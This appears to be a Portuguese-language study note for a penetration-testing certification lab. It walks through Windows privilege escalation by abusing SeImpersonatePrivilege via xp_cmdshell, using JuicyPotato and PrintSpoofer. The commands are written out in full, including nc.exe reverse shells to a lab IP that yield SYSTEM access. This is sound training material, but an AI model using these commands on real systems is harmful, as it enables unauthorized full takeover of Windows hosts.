> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/seimpersonate-and-seassignprimarytoken.md).

# SeImpersonate and SeAssignPrimaryToken

**Exemplo de SeImpersonate - JuicyPotato**

* **Conectando com MSSQLClient.py**

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

* **Habilitando o xp\_cmdshell**

```bash
enable_xp_cmdshell
```

* **Confirmação de acesso**

```bash
xp_cmdshell whoami
```

* **Privilégios da conta corrente**

```bash
xp_cmdshell whoami /priv
```

* Confirmar se o privilégio [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) está listado. Esse privilégio pode ser usado para se passar por uma conta privilegiada, como a do usuário `NT AUTHORITY\SYSTEM`
* **Aumento de privilégios usando JuicyPotato**

```bash
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**Sistema de captura Shell**

* Esta operação é concluída com sucesso e um shell `NT AUTHORITY\SYSTEM`é recebido.

```bash
sudo nc -lnvp 8443
```

**PrintSpoofer e RoguePotato**

* O JuicyPotato não funciona no Windows Server 2019 e no Windows 10 versão 1809 ou posterior. No entanto, [o PrintSpoofer](https://github.com/itm4n/PrintSpoofer) e [o RoguePotato](https://github.com/antonioCoco/RoguePotato) podem ser usados ​​para explorar os mesmos privilégios e obter `NT AUTHORITY\SYSTEM`acesso privilegiado.&#x20;
* **Aumentando os privilégios usando o PrintSpoofer**

```bash
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

* **Catching Reverse Shell as SYSTEM**

```bash
nc -lnvp 8443
```
